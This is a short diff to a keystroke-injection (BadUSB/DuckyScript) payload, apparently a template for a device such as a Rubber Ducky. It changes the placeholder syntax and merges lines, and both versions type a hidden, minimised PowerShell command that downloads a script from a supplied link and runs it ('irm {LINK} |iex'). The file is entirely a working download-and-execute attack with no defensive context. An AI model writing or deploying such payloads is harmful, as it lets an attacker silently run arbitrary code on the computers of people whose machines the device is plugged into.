@@ -1,9 +1,5 @@
-REM Downloads and executes commands in powershell
-DELAY #START_DELAY
+DELAY {START_DELAY}
 GUI r
-DELAY #RUN_DELAY
-STRING cmd /c start /min powershell -w 1 "irm
-SPACE
-STRING #LINK
-STRING |iex"
+DELAY {RUN_DELAY}
+STRING cmd /c start /min powershell -w 1 "irm {LINK} |iex"
 ENTER
